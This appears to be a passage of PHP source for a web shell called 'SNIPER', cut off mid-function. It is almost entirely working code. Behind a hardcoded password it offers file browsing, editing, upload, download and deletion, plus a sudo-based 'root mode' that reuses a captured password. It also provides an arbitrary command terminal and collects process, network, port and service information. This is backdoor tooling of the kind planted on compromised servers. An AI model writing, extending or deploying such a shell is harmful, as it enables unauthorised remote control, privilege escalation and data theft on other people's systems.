<?php
session_start();

// ==================== CONFIG ====================
define('SHELL_NAME', 'SNIPER');
define('SHELL_VERSION', 'SNIPER');
define('AUTH_PASSWORD', 'sniper'); 

// ==================== AUTH ====================
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (isset($_POST['login_password'])) {
    if ($_POST['login_password'] === AUTH_PASSWORD) {
        $_SESSION['sniper_auth'] = true;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $login_error = 'Invalid password';
    }
}

if (empty($_SESSION['sniper_auth'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SNIPER | Login</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                background: #050505;
                font-family: 'Segoe UI', system-ui, sans-serif;
                color: #e0e0e0;
            }
            .login-box {
                background: #0d0d0d;
                border: 1px solid #ff0033;
                border-radius: 12px;
                padding: 40px 50px;
                width: 100%;
                max-width: 380px;
                box-shadow: 0 0 40px rgba(255, 0, 51, 0.15);
                text-align: center;
            }
            .logo {
                font-size: 2.8rem;
                font-weight: 800;
                letter-spacing: 6px;
                background: linear-gradient(90deg, #ff0033, #ff4d6d);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                margin-bottom: 8px;
            }
            .sub {
                color: #888;
                font-size: 0.85rem;
                margin-bottom: 30px;
                letter-spacing: 2px;
            }
            input[type="password"] {
                width: 100%;
                padding: 14px 16px;
                background: #111;
                border: 1px solid #333;
                border-radius: 6px;
                color: #fff;
                font-size: 1rem;
                outline: none;
                margin-bottom: 16px;
            }
            input[type="password"]:focus {
                border-color: #ff0033;
            }
            button {
                width: 100%;
                padding: 14px;
                background: linear-gradient(90deg, #ff0033, #cc0029);
                border: none;
                border-radius: 6px;
                color: #fff;
                font-weight: 700;
                font-size: 1rem;
                cursor: pointer;
                letter-spacing: 1px;
            }
            button:hover { opacity: 0.9; }
            .error {
                color: #ff4d6d;
                font-size: 0.9rem;
                margin-bottom: 15px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">SNIPER</div>
            <div class="sub">SECURE TERMINAL ACCESS</div>
            <?php if (!empty($login_error)): ?>
                <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            <form method="post">
                <input type="password" name="login_password" placeholder="Enter Password" autofocus required>
                <button type="submit">AUTHENTICATE</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================== ROOT MODE (sudo elevation) ====================
define('SNIPER_ROOT_TTL', 1800);   // auto-lock after 30 min

function rootModeOn(): bool {
    if (empty($_SESSION['sniper_sudo'])) return false;
    if ((time() - (int)($_SESSION['sniper_sudo_time'] ?? 0)) > SNIPER_ROOT_TTL) {
        unset($_SESSION['sniper_sudo'], $_SESSION['sniper_sudo_time']);
        return false;
    }
    $_SESSION['sniper_sudo_time'] = time();
    return true;
}

function sudoRun(string $cmd): array {
    $pw = $_SESSION['sniper_sudo'] ?? '';
    if ($pw === '') return [1, '', 'root-mode-off'];
    $spec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $p = @proc_open('/bin/sh -c ' . escapeshellarg('exec sudo -S -p "" ' . $cmd), $spec, $pp);
    if (!is_resource($p)) return [1, '', 'spawn-failed'];
    fwrite($pp[0], $pw . "\n");
    fclose($pp[0]);
    $out = (string)stream_get_contents($pp[1]);
    fclose($pp[1]);
    $err = (string)stream_get_contents($pp[2]);
    fclose($pp[2]);
    $code = proc_close($p);
    if ($code !== 0 && preg_match('/try again|incorrect password|authentication failure/i', $err)) {
        unset($_SESSION['sniper_sudo'], $_SESSION['sniper_sudo_time']);
        return [$code, $out, '__AUTH__'];
    }
    return [$code, $out, $err];
}

function rootExists(string $path, string $flag = '-e'): bool {
    [$c] = sudoRun('test ' . $flag . ' ' . escapeshellarg($path));
    return $c === 0;
}

function rootListRaw(string $path): string {
    [$c, $o] = sudoRun("find " . escapeshellarg($path)
        . " -maxdepth 1 -mindepth 1 -printf '%y\\t%s\\t%T@\\t%m\\t%P\\n' 2>/dev/null");
    return $c === 0 ? $o : '';
}

// ==================== FILE DOWNLOAD ====================
if (isset($_GET['download_file']) && !empty($_GET['download_file'])) {
    $dl_path = $_GET['download_file'];
    if (is_file($dl_path) && is_readable($dl_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dl_path) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Content-Length: ' . filesize($dl_path));
        header('Cache-Control: must-revalidate');
        @readfile($dl_path);
        exit;
    }
    if (rootModeOn()) {
        [$drc, $dout] = sudoRun('sh -c ' . escapeshellarg(
            'test -f ' . escapeshellarg($dl_path) . ' && cat -- ' . escapeshellarg($dl_path)));
        if ($drc === 0 && $dout !== '') {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($dl_path) . '"');
            header('Content-Transfer-Encoding: binary');
            header('Content-Length: ' . strlen($dout));
            echo $dout;
            exit;
        }
    }
    http_response_code(404);
    die('Cannot download: file not found or not readable');
}

// ==================== FILE SAVE (EDIT) ====================
$save_status = null;   // 'success' | 'error'
$save_message = '';

if (isset($_POST['save_file_action'], $_POST['edit_path'], $_POST['file_content'])) {
    $sp_path = $_POST['edit_path'];
    $sp_exists = is_file($sp_path) || (rootModeOn() && rootExists($sp_path, '-f'));
    $can_write = $sp_exists && (is_writable($sp_path) || rootModeOn());
    if ($can_write) {
        if (rootModeOn() && !is_writable($sp_path)) {
            [$wc] = sudoRun('printf %s ' . escapeshellarg(base64_encode($_POST['file_content']))
                . ' | base64 -d | tee ' . escapeshellarg($sp_path) . ' >/dev/null');
            $bytes = ($wc === 0) ? strlen($_POST['file_content']) : false;
        } else {
            $bytes = @file_put_contents($sp_path, $_POST['file_content']);
        }
        if ($bytes !== false) {
            $save_status = 'success';
            $save_message = "Saved successfully (" . $bytes . " bytes written)";
        } else {
            $save_status = 'error';
            $save_message = 'Write failed - check disk space or permissions';
        }
    } else {
        $save_status = 'error';
        $save_message = 'File is not writable or does not exist';
    }
}

// ==================== CHMOD ====================
$chmod_status = null;
$chmod_message = '';

if (isset($_POST['chmod_action'], $_POST['chmod_path'], $_POST['chmod_value'])) {
    $ch_path = $_POST['chmod_path'];
    $ch_val = trim($_POST['chmod_value']);
    if (!preg_match('/^[0-7]{3,4}$/', $ch_val)) {
        $chmod_status = 'error';
        $chmod_message = 'Invalid octal value. Use format like 644 or 0755';
    } elseif (!file_exists($ch_path) && !(rootModeOn() && rootExists($ch_path))) {
        $chmod_status = 'error';
        $chmod_message = 'File not found';
    } elseif (rootModeOn()) {
        [$chc] = sudoRun('chmod ' . escapeshellarg($ch_val) . ' -- ' . escapeshellarg($ch_path));
        if ($chc === 0) {
            $chmod_status = 'success';
            $chmod_message = 'Permissions changed to ' . $ch_val . ' (root)';
        } else {
            $chmod_status = 'error';
            $chmod_message = 'chmod failed (root)';
        }
    } else {
        $ok = @chmod($ch_path, octdec($ch_val));
        if ($ok) {
            $chmod_status = 'success';
            $chmod_message = 'Permissions changed to ' . $ch_val;
        } else {
            $chmod_status = 'error';
            $chmod_message = 'chmod() failed - probably not owner or safe mode';
        }
    }
}

// ==================== RAW FILE STREAM (for image preview) ====================
if (isset($_GET['raw_file']) && !empty($_GET['raw_file'])) {
    $rw_path = $_GET['raw_file'];
    if (is_file($rw_path) && is_readable($rw_path) && filesize($rw_path) <= 10 * 1024 * 1024) {
        $mime = function_exists('mime_content_type') ? @mime_content_type($rw_path) : 'application/octet-stream';
        if (!$mime || $mime === false) $mime = 'application/octet-stream';
        header('Content-Type: ' . $mime);
        header('Content-Length: ' . filesize($rw_path));
        @readfile($rw_path);
        exit;
    }
    if (rootModeOn()) {
        [$rrc, $rout] = sudoRun('sh -c ' . escapeshellarg(
            'test -f ' . escapeshellarg($rw_path) . ' && cat -- ' . escapeshellarg($rw_path)));
        if ($rrc === 0 && $rout !== '' && strlen($rout) <= 10 * 1024 * 1024) {
            $extmap = [
                'png' => 'image/png', 'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg',
                'gif' => 'image/gif', 'webp' => 'image/webp', 'bmp' => 'image/bmp',
                'svg' => 'image/svg+xml', 'ico' => 'image/x-icon',
            ];
            $rext = strtolower(pathinfo($rw_path, PATHINFO_EXTENSION));
            header('Content-Type: ' . ($extmap[$rext] ?? 'application/octet-stream'));
            header('Content-Length: ' . strlen($rout));
            echo $rout;
            exit;
        }
    }
    http_response_code(404);
    die('Not found');
}

// ==================== FLASH MESSAGE (PRG pattern) ====================
$flash = null;
if (isset($_SESSION['sniper_flash'])) {
    $flash = $_SESSION['sniper_flash'];
    unset($_SESSION['sniper_flash']);
}
function setFlash($type, $msg) {
    $_SESSION['sniper_flash'] = ['type' => $type, 'message' => $msg];
}
function prgBack($work_dir) {
    header('Location: ?work_dir=' . urlencode($work_dir));
    exit;
}

// ==================== RECURSIVE HELPERS ====================
function rrmdir($dir) {
    if (!is_dir($dir)) return unlink($dir);
    $items = @scandir($dir) ?: [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!rrmdir($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return @rmdir($dir);
}
function rcopy($src, $dst) {
    if (is_file($src)) return @copy($src, $dst);
    if (!is_dir($dst)) @mkdir($dst, 0777, true);
    $items = @scandir($src) ?: [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!rcopy($src . DIRECTORY_SEPARATOR . $item, $dst . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return true;
}
function zip_collect_entries(array $list): array {
    $entries = [];
    foreach ($list as $p) {
        if (is_file($p)) { $entries[$p] = basename($p); continue; }
        if (!is_dir($p)) continue;
        $iter = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($p, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($iter as $f) {
            if (!$f->isFile()) continue;
            $entries[$f->getPathname()] = basename($p) . '/' . substr($f->getPathname(), strlen($p) + 1);
        }
    }
    return $entries;
}
function php_zip_create(string $tmpPath, array $entries): bool {
    $out = @fopen($tmpPath, 'wb');
    if (!$out) return false;
    $cd = '';
    $offset = 0;
    foreach ($entries as $path => $name) {
        $data = @file_get_contents($path);
        if ($data === false || strlen($data) > 0x7FFFFFFF) continue;
        $crc  = crc32($data);
        $size = strlen($data);
        $t = @filemtime($path) ?: time();
        $dosDate = ((int)date('Y', $t) - 1980) << 9 | (int)date('n', $t) << 5 | (int)date('j', $t);
        $dosTime = (int)date('G', $t) << 11 | (int)date('i', $t) << 5 | (int)((int)date('s', $t) / 2);
        $lfh = "PK\x03\x04"
             . pack('v', 20) . pack('v', 0) . pack('v', 0)
             . pack('v', $dosTime) . pack('v', $dosDate)
             . pack('V', $crc) . pack('V', $size) . pack('V', $size)
             . pack('v', strlen($name)) . pack('v', 0) . $name;
        fwrite($out, $lfh . $data);
        $cd .= "PK\x01\x02"
             . pack('v', 20) . pack('v', 20) . pack('v', 0) . pack('v', 0)
             . pack('v', $dosTime) . pack('v', $dosDate)
             . pack('V', $crc) . pack('V', $size) . pack('V', $size)
             . pack('v', strlen($name)) . pack('v', 0) . pack('v', 0) . pack('v', 0) . pack('v', 0)
             . pack('V', 32) . pack('V', $offset) . $name;
        $offset += strlen($lfh) + $size;
    }
    $eocd = "PK\x05\x06"
          . pack('v', 0) . pack('v', 0)
          . pack('v', count($entries)) . pack('v', count($entries))
          . pack('V', strlen($cd)) . pack('V', $offset) . pack('v', 0);
    fwrite($out, $cd . $eocd);
    fclose($out);
    return true;
}
function rzip($src, $zipPath) {
    if (!class_exists('ZipArchive')) {
        return php_zip_create($zipPath, zip_collect_entries([$src])) && filesize($zipPath) > 22;
    }
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return false;
    if (is_file($src)) {
        $zip->addFile($src, basename($src));
    } else {
        $base = dirname($src);
        $iter = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($iter as $f) {
            $zip->addFile($f->getPathname(), basename($src) . '/' . substr($f->getPathname(), strlen($base) + 1));
        }
    }
    return $zip->close();
}

// ==================== FILE OPERATIONS ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_op'])) {
    $op     = $_POST['file_op'];
    $target = trim($_POST['target'] ?? '');
    $dest   = trim($_POST['dest'] ?? '');
    $wd     = trim($_POST['work_dir'] ?? getcwd());

    $guard = fn($p) => $p !== '' && $p !== '/' && !preg_match('#(^|/)\.\.(/|$)#', $p);

    if (!$guard($target) && in_array($op, ['delete','rename','copy','move','zip','unzip'])) {
        setFlash('error', 'Invalid or protected path');
        prgBack($wd);
    }

    // ---- Batch zip download: stream archive, no redirect ----
    if ($op === 'batch_zip' && !empty($_POST['targets_json'])) {
        $list = json_decode($_POST['targets_json'], true) ?: [];
        $list = array_values(array_filter($list, fn($p) => is_string($p) && $guard($p)
            && (file_exists($p) || (rootModeOn() && rootExists($p)))));
        if (!$list) die('Nothing selected');
        $tmp = sys_get_temp_dir() . '/sniper_dl_' . uniqid() . '.zip';
        $stage = '';
        if (rootModeOn()) {
            // stage elevated targets into a readable temp copy
            $stage = sys_get_temp_dir() . '/sniper_stage_' . uniqid();
            @mkdir($stage, 0700, true);
            $entries = [];
            foreach ($list as $i => $p) {
                $sd = $stage . '/t' . $i;
                [$cpc] = sudoRun('cp -a -- ' . escapeshellarg($p) . ' ' . escapeshellarg($sd));
                if ($cpc !== 0) continue;
                sudoRun('chown -R ' . getmyuid() . ':' . getmygid() . ' -- ' . escapeshellarg($sd));
                if (is_file($sd)) { $entries[$sd] = basename($p); continue; }
                $siter = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($sd, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($siter as $sf) {
                    if (!$sf->isFile()) continue;
                    $entries[$sf->getPathname()] = basename($p) . '/' . substr($sf->getPathname(), strlen($sd) + 1);
                }
            }
        } else {
            $entries = zip_collect_entries($list);
        }
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) die('zip open failed');
            foreach ($entries as $abs => $name) $zip->addFile($abs, $name);
            $zip->close();
        } else {
            if (!php_zip_create($tmp, $entries)) die('zip create failed');
        }
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="sniper_batch_' . count($list) . '.zip"');
        header('Content-Length: ' . filesize($tmp));
        @readfile($tmp);
        @unlink($tmp);
        if ($stage !== '') rrmdir($stage);
        exit;
    }

    switch ($op) {
        case 'delete':
            $t_exists = file_exists($target) || (rootModeOn() && rootExists($target));
            if (!$t_exists) { setFlash('error', 'Target not found'); break; }
            if (rootModeOn()) {
                [$dlc] = sudoRun('rm -rf -- ' . escapeshellarg($target));
                $ok = ($dlc === 0);
            } else {
                $ok = is_dir($target) ? rrmdir($target) : @unlink($target);
            }
            setFlash($ok ? 'success' : 'error', $ok ? ('Deleted: ' . basename($target)) : 'Delete failed');
            break;

        case 'rename':
        case 'move':
            if ($target === '' || $dest === '') { setFlash('error', 'Missing source or destination'); break; }
            if (file_exists($dest)) { setFlash('error', 'Destination already exists: ' . basename($dest)); break; }
            if (rootModeOn()) {
                [$mvc] = sudoRun('mv -f -- ' . escapeshellarg($target) . ' ' . escapeshellarg($dest));
                $ok = ($mvc === 0);
            } else {
                $ok = @rename($target, $dest);
            }
            setFlash($ok ? 'success' : 'error',
                $ok ? (($op === 'rename' ? 'Renamed to ' : 'Moved to ') . basename($dest)) : ucfirst($op) . ' failed');
            break;

        case 'copy':
            if ($dest === '') { setFlash('error', 'Missing destination name'); break; }
            if (file_exists($dest)) { setFlash('error', 'Destination already exists: ' . basename($dest)); break; }
            if (rootModeOn()) {
                [$cpc] = sudoRun('cp -a -- ' . escapeshellarg($target) . ' ' . escapeshellarg($dest));
                if ($cpc === 0) sudoRun('chown -R ' . getmyuid() . ':' . getmygid() . ' -- ' . escapeshellarg($dest));
                $ok = ($cpc === 0);
            } else {
                $ok = is_dir($target) ? rcopy($target, $dest) : @copy($target, $dest);
            }
            setFlash($ok ? 'success' : 'error', $ok ? ('Copied to ' . basename($dest)) : 'Copy failed');
            break;

        case 'newfile':
            if ($target === '') { setFlash('error', 'Empty filename'); break; }
            $fp = rtrim($wd, '/') . '/' . basename($target);
            if (file_exists($fp)) { setFlash('error', 'Already exists: ' . basename($fp)); break; }
            if (rootModeOn()) {
                [$nfc] = sudoRun('touch -- ' . escapeshellarg($fp));
                $ok = ($nfc === 0);
            } else {
                $ok = @file_put_contents($fp, '') !== false;
            }
            setFlash($ok ? 'success' : 'error', $ok ? ('Created file ' . basename($fp)) : 'Create failed');
            break;

        case 'newfolder':
            if ($target === '') { setFlash('error', 'Empty folder name'); break; }
            $fp = rtrim($wd, '/') . '/' . basename($target);
            if (file_exists($fp)) { setFlash('error', 'Already exists: ' . basename($fp)); break; }
            if (rootModeOn()) {
                [$ndc] = sudoRun('mkdir -p -- ' . escapeshellarg($fp));
                $ok = ($ndc === 0);
            } else {
                $ok = @mkdir($fp, 0777, true);
            }
            setFlash($ok ? 'success' : 'error', $ok ? ('Created folder ' . basename($fp)) : 'mkdir failed');
            break;

        case 'zip':
            $zp = rtrim($wd, '/') . '/' . basename($target) . '.zip';
            if (file_exists($zp)) { setFlash('error', 'Archive already exists: ' . basename($zp)); break; }
            if (rootModeOn()) {
                $zstage = sys_get_temp_dir() . '/sniper_z_' . uniqid();
                @mkdir($zstage, 0700, true);
                $sp = $zstage . '/' . basename($target);
                $tmpzp = sys_get_temp_dir() . '/sniper_zout_' . uniqid() . '.zip';
                [$zc] = sudoRun('cp -a -- ' . escapeshellarg($target) . ' ' . escapeshellarg($sp));
                $ok = false;
                if ($zc === 0) {
                    sudoRun('chown -R ' . getmyuid() . ':' . getmygid() . ' -- ' . escapeshellarg($sp));
                    if (rzip($sp, $tmpzp)) {
                        [$mvc] = sudoRun('mv -f -- ' . escapeshellarg($tmpzp) . ' ' . escapeshellarg($zp));
                        $ok = ($mvc === 0);
                        if (!$ok) @unlink($tmpzp);
                    }
                }
                sudoRun('rm -rf -- ' . escapeshellarg($zstage));
            } else {
                $ok = rzip($target, $zp);
            }
            setFlash($ok ? 'success' : 'error', $ok ? ('Archived to ' . basename($zp)) : 'Zip failed');
            break;

        case 'unzip':
            if (strtolower(pathinfo($target, PATHINFO_EXTENSION)) !== 'zip') { setFlash('error', 'Not a .zip file'); break; }
            $ex = rtrim($wd, '/') . '/' . pathinfo($target, PATHINFO_FILENAME);
            if (file_exists($ex)) { setFlash('error', 'Extract folder already exists'); break; }
            if (rootModeOn()) {
                [$uzc, , $uze] = sudoRun('unzip -o -q ' . escapeshellarg($target) . ' -d ' . escapeshellarg($ex));
                if ($uzc === 0) {
                    sudoRun('chown -R ' . getmyuid() . ':' . getmygid() . ' -- ' . escapeshellarg($ex));
                    setFlash('success', "Extracted (root) to " . basename($ex));
                } else {
                    setFlash('error', stripos($uze, 'not found') !== false
                        ? 'unzip tool not found on server'
                        : 'Unzip failed (root)');
                }
            } elseif (!class_exists('ZipArchive')) {
                setFlash('error', 'ZipArchive extension not available');
            } else {
                $zip = new ZipArchive();
                if ($zip->open($target) === true) {
                    @$zip->extractTo($ex);
                    $count = $zip->numFiles;
                    $zip->close();
                    setFlash('success', "Extracted {$count} entries to " . basename($ex));
                } else {
                    setFlash('error', 'Cannot open archive');
                }
            }
            break;

        case 'batch_delete':
            $targets = json_decode($_POST['targets_json'] ?? '', true) ?: [];
            $okN = 0; $failN = 0;
            foreach ($targets as $tp) {
                if (!is_string($tp) || !$guard($tp)) { $failN++; continue; }
                if (!file_exists($tp) && !(rootModeOn() && rootExists($tp))) { $failN++; continue; }
                if (rootModeOn()) {
                    sudoRun('rm -rf -- ' . escapeshellarg($tp))[0] === 0 ? $okN++ : $failN++;
                } else {
                    (is_dir($tp) ? rrmdir($tp) : @unlink($tp)) ? $okN++ : $failN++;
                }
            }
            setFlash($okN ? 'success' : 'error',
                "Deleted {$okN} item(s)" . ($failN ? ", {$failN} failed" : ''));
            break;
    }
    prgBack($wd);
}

// ==================== UPLOAD (multi-file) ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_input'])) {
    $up_wd = trim($_POST['up_work_dir'] ?? getcwd());
    $names = (array)$_FILES['upload_input']['name'];
    $okN = 0; $failN = 0; $lastErr = '';
    foreach ($names as $i => $nm) {
        if ($_FILES['upload_input']['error'][$i] !== UPLOAD_ERR_OK) { $failN++; $lastErr = 'code ' . $_FILES['upload_input']['error'][$i]; continue; }
        if ((int)$_FILES['upload_input']['size'][$i] > 10 * 1024 * 1024) { $failN++; $lastErr = basename($nm) . ' >10MB'; continue; }
        if (!is_uploaded_file($_FILES['upload_input']['tmp_name'][$i])) { $failN++; continue; }
        $dest = rtrim($up_wd, '/') . '/' . basename($nm);
        if (file_exists($dest) || (rootModeOn() && rootExists($dest))) { $failN++; $lastErr = basename($nm) . ' exists'; continue; }
        if (rootModeOn() && !@move_uploaded_file($_FILES['upload_input']['tmp_name'][$i], $dest)) {
            [$uvc, , $uve] = sudoRun('mv -f -- ' . escapeshellarg($_FILES['upload_input']['tmp_name'][$i]) . ' ' . escapeshellarg($dest));
            if ($uvc === 0 && $uve !== '__AUTH__') $okN++;
            else { $failN++; $lastErr = basename($nm); }
        } elseif (@move_uploaded_file($_FILES['upload_input']['tmp_name'][$i], $dest)) {
            $okN++;
        } else {
            $failN++; $lastErr = basename($nm);
        }
    }
    if ($okN || $failN) {
        setFlash($failN && !$okN ? 'error' : 'success',
            "Uploaded {$okN} file(s)" . ($failN ? ", {$failN} failed" : '') . ($lastErr ? " [{$lastErr}]" : ''));
    }
    prgBack($up_wd);
}

// ==================== ROOT MODE UNLOCK / LOCK ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['root_op'])) {
    $rw = trim($_POST['work_dir'] ?? getcwd());
    if ($_POST['root_op'] === 'unlock') {
        $_SESSION['sniper_sudo'] = (string)($_POST['root_password'] ?? '');
        $_SESSION['sniper_sudo_time'] = time();
        [$rc, , $re] = sudoRun('true');
        if ($rc === 0 && $re !== '__AUTH__') {
            setFlash('success', 'ROOT MODE ENABLED — elevated file operations active');
        } else {
            unset($_SESSION['sniper_sudo'], $_SESSION['sniper_sudo_time']);
            setFlash('error', 'Wrong sudo password — Root Mode NOT enabled');
        }
    } else {
        unset($_SESSION['sniper_sudo'], $_SESSION['sniper_sudo_time']);
        setFlash('success', 'Root Mode disabled');
    }
    prgBack($rw);
}

// ==================== AJAX REALTIME STATS ====================
if (isset($_GET['ajax_stats'])) {
    header('Content-Type: application/json');
    $ld = function_exists('sys_getloadavg') ? sys_getloadavg() : [0, 0, 0];
    $ut = @file_exists('/proc/uptime') ? (float)explode(' ', @file_get_contents('/proc/uptime'))[0] : 0;
    echo json_encode([
        'load'       => round($ld[0], 2),
        'mem_usage'  => memory_get_usage(true),
        'mem_peak'   => memory_get_peak_usage(true),
        'uptime_sec' => (int)$ut,
        'time'       => date('H:i:s'),
    ]);
    exit;
}

// ==================== AJAX: FOLDER SIZE (recursive, capped) ====================
if (isset($_GET['ajax_dirsize'])) {
    header('Content-Type: application/json');
    $dp = $_GET['ajax_dirsize'];
    $size = 0; $count = 0; $truncated = false;
    if (is_dir($dp)) {
        try {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dp, FilesystemIterator::SKIP_DOTS)
            );
            foreach ($it as $f) {
                if ($count >= 50000) { $truncated = true; break; }
                $size += $f->getSize(); $count++;
            }
        } catch (Exception $e) { /* permission gaps */ }
    } elseif (rootModeOn() && rootExists($dp, '-d')) {
        [$sc, $so] = sudoRun('du -sb -- ' . escapeshellarg($dp) . ' 2>/dev/null');
        if ($sc === 0) $size = (int)trim(explode("\t", trim($so))[0]);
        [$fc, $fo] = sudoRun('find ' . escapeshellarg($dp) . ' -type f 2>/dev/null | wc -l');
        if ($fc === 0) $count = (int)trim($fo);
        if ($count > 50000) { $count = 50000; $truncated = true; }
    }
    echo json_encode(['path' => $dp, 'size' => $size, 'files' => $count, 'truncated' => $truncated]);
    exit;
}

// ==================== AJAX: DUPLICATE FINDER (name+size, depth 4) ====================
if (isset($_GET['ajax_dupes'])) {
    header('Content-Type: application/json');
    $dd = realpath($_GET['ajax_dupes'] ?? '') ?: '';
    $groups = [];
    $map = []; $scanned = 0;
    if ($dd && is_dir($dd)) {
        try {
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dd, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($it as $f) {
                if ($scanned++ >= 4000) break;
                if ($it->getDepth() > 4) continue;
                $fp = $f->getPathname();
                if (!$f->isFile()) continue;
                $sz = $f->getSize();
                if ($sz === 0) continue;
                $key = strtolower($f->getFilename()) . '|' . $sz;
                if (!isset($map[$key])) $map[$key] = [];
                $map[$key][] = str_replace('\\', '/', $fp);
            }
        } catch (Exception $e) { /* skip unreadable */ }
    } elseif ($dd === '' && rootModeOn()) {
        $ddRaw = $_GET['ajax_dupes'] ?? '';
        if (rootExists($ddRaw, '-d')) {
            [$fc2, $fo2] = sudoRun("find " . escapeshellarg($ddRaw)
                . " -maxdepth 4 -type f -size +0c -printf '%s\\t%P\\n' 2>/dev/null");
            foreach (explode("\n", rtrim($fo2, "\n")) as $ln) {
                if (++$scanned > 4000) { break; }
                $tab = strpos($ln, "\t");
                if ($tab === false) continue;
                $sz = (int)substr($ln, 0, $tab);
                $rel = substr($ln, $tab + 1);
                $base = basename($rel);
                $key = strtolower($base) . '|' . $sz;
                if (!isset($map[$key])) $map[$key] = [];
                $map[$key][] = rtrim($ddRaw, '/') . '/' . $rel;
            }
        }
    }
    foreach ($map as $paths) {
        if (count($paths) > 1) {
            $gsz = is_readable($paths[0]) ? (int)filesize($paths[0]) : ((int)explode('|', array_search($paths, $map, true))[1]);
            $groups[] = ['count' => count($paths), 'size' => $gsz, 'paths' => $paths];
        }
    }
    usort($groups, fn($a, $b) => $b['count'] - $a['count']);
    echo json_encode(['dir' => $dd !== '' ? $dd : ($_GET['ajax_dupes'] ?? ''), 'groups' => array_slice($groups, 0, 100), 'total_groups' => count($groups)]);
    exit;
}

// ==================== AJAX: TERMINAL EXEC (single-pane terminal) ====================
if (($_GET['ajax'] ?? '') === 'term_exec' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    $tin = json_decode((string)file_get_contents('php://input'), true);
    if (!is_array($tin)) { echo json_encode(['ok' => false, 'error' => 'bad payload']); exit; }
    $t_cmd  = (string)($tin['command'] ?? '');
    $t_wd   = (string)($tin['work_dir'] ?? '');
    $t_hide = !empty($tin['show_hidden']);
    if (trim($t_cmd) === '') { echo json_encode(['ok' => true, 'output' => '', 'cwd' => $t_wd, 'viewer' => null]); exit; }
    if ($t_wd === '' || !(is_dir($t_wd) || (rootModeOn() && rootExists(rtrim($t_wd, '/'), '-d')))) {
        echo json_encode(['ok' => false, 'error' => 'invalid directory']);
        exit;
    }
    @chdir($t_wd);
    [$t_dirs, $t_files] = sniperRefreshListing($t_wd, $t_hide);
    $t_out    = sniperExec($t_cmd, $t_wd, $t_dirs, $t_files, $t_hide);
    $t_viewer = null;
    if (preg_match('/^__SNIPER_VIEW__(.+)$/m', $t_out, $vm)) {
        $t_viewer = json_decode(trim($vm[1]), true);
        $t_out = preg_replace('/^__SNIPER_VIEW__.+\n?/m', '', $t_out);
    }
    echo json_encode(['ok' => true, 'output' => $t_out, 'cwd' => $t_wd, 'viewer' => $t_viewer]);
    exit;
}

// ==================== SYSTEM INFO GATHERING ====================
function runCmdSafe($cmd) {
    if (!function_exists('shell_exec')) return null;
    $out = @shell_exec($cmd . ' 2>/dev/null');
    return ($out === null || trim((string)$out) === '') ? null : trim((string)$out);
}
$sysinfo_processes = runCmdSafe('ps aux --sort=-%cpu | head -30');
$sysinfo_net       = runCmdSafe('ip -brief address 2>/dev/null || ifconfig 2>/dev/null');
$sysinfo_ports     = runCmdSafe('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null');
$sysinfo_services  = runCmdSafe('systemctl list-units --type=service --state=running --no-pager --no-legend 2>/dev/null | head -25');
$sysinfo_exts      = implode(', ', get_loaded_extensions());
$sysinfo_server    = ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . ' · SAPI: ' . PHP_SAPI . ' · ' . php_uname('r');

// ==================== DETAILED PERMISSIONS HELPER ====================
function getFileInfoDetailed($path) {
    if (!file_exists($path)) return null;
    clearstatcache(true, $path);
    $perms = fileperms($path);

    // Symbolic rwx string like -rw-r--r--
    $sym = '';
    $sym .= (($perms & 0x0100) ? 'r' : '-');
    $sym .= (($perms & 0x0080) ? 'w' : '-');
    $sym .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $sym .= (($perms & 0x0020) ? 'r' : '-');
    $sym .= (($perms & 0x0010) ? 'w' : '-');
